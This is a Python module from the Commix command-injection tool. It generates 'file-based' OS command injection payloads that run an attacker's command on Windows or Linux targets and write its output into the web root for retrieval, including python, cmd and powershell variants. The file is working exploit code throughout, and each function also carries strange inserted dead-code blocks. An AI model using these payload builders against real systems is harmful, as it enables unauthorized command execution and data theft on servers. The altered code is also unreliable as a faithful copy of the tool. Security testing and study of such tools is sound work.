"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""
'\nThe "file-based" technique on semiblind OS command injection.\nThe available "file-based" payloads.\n'
from src.utils import menu
from src.utils import settings
from src.core.injections.controller import checks
'\nFile-based decision payload (check if host is vulnerable).\n'

def decision(separator, TAG, OUTPUT_TEXTFILE):
    if False:
        i = 10
        return i + 15
    if settings.TARGET_OS == settings.OS.WINDOWS:
        payload = separator + settings.WIN_FILE_WRITE_OPERATOR + settings.WEB_ROOT.replace('\\', '\\\\') + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + '\'"'
    else:
        payload = separator + 'echo ' + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE + separator
    return payload
'\n__Warning__: The alternative shells are still experimental.\n'

def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
    if False:
        while True:
            i = 10
    if settings.TARGET_OS == settings.OS.WINDOWS:
        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c "open(\'' + OUTPUT_TEXTFILE + "','w').write('" + TAG + '\')"'
        payload = separator + 'for /f "tokens=*" %i in (\'cmd /c ' + python_payload + "') do @set /p = %i " + settings.CMD_NUL
    else:
        payload = separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c "f=open(\'' + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + '\')\nf.close()\n")'
    if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):
        payload = payload.replace('\n', separator)
    elif settings.TARGET_OS != settings.OS.WINDOWS:
        payload = payload.replace('\n', '%0d')
    return payload
'\nExecute shell commands on vulnerable host.\n'

def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
    if False:
        while True:
            i = 10
    if settings.TFB_DECIMAL == True:
        payload = separator + cmd
    elif settings.TARGET_OS == settings.OS.WINDOWS:
        payload = separator + 'for /f "tokens=*" %i in (\'cmd /c "' + 'powershell.exe -InputFormat none write-host (cmd /c "' + cmd + '")"\') do ' + settings.WIN_FILE_WRITE_OPERATOR + settings.WEB_ROOT.replace('\\', '\\\\') + OUTPUT_TEXTFILE + " '%i'" + settings.CMD_NUL
    else:
        settings.USER_SUPPLIED_CMD = cmd
        payload = separator + cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE + separator
    return payload
'\n__Warning__: The alternative shells are still experimental.\n'

def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
    if False:
        print('Hello World!')
    if settings.TARGET_OS == settings.OS.WINDOWS:
        if settings.REVERSE_TCP:
            payload = separator + cmd + settings.SINGLE_WHITESPACE
        else:
            python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c "import os; os.system(\'' + cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE + '\')"'
            payload = separator + 'for /f "tokens=*" %i in (\'cmd /c ' + python_payload + "') do @set /p = %i " + settings.CMD_NUL
    else:
        payload = separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c "f=open(\'' + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $(" + cmd + '))\')\nf.close()\n")'
    if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):
        payload = payload.replace('\n', separator)
    elif settings.TARGET_OS != settings.OS.WINDOWS:
        payload = payload.replace('\n', '%0d')
    return payload